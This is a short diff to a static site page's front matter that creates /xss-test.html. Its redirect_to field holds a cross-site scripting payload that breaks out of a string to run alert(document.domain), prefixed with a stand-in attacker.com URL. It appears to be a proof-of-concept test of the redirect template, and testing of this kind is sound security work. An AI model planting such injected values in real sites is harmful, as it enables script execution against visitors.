@@ -1,6 +1,4 @@
 ---
-layout: post
-title: "Recon Test"
-redirect_to:
-  - '"; alert(document.domain); //'
+permalink: /xss-test.html
+redirect_to: 'https://attacker.com"; alert(document.domain); //'
 ---
